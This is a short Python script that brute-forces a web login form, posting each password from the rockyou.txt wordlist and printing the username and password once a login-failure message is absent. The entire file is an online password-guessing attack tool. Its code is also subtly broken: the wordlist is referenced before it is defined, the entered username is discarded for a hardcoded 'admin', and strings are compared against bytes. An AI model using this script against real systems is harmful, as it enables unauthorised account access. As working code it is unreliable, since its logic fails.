#!/usr/bin/env python

import requests
from tqdm import tqdm

def bruteforce(username, url):
    for password in tqdm(wordlist, total = num_words, unit = "password"):
        password = password.strip()
        data_dict["password"] = password
        response = requests.post(url, data = data_dict)
        for denied in access_denied:
            if denied not in response.content:
                print("[+] Username: --> " + username)
                print("[+] Password: --> " + password) 
                exit()
    
    print("[!] Password not found. Try another wordlist.")


url = input("[+] Enter URL -> ")
username = input("[+] Username -> ")
data_dict = {"username": "admin", "password": "", "Login": "submit"}
access_denied = ["Login failed", "Incorrect password"]
num_words = len(list(open(wordlist, "rb")))
print("Total passwords to test:", num_words)


with open("/home/Mitch/Documents/Password_Cracking/Wordlists/rockyou.txt", "r") as wordlist:
    bruteforce(username, url)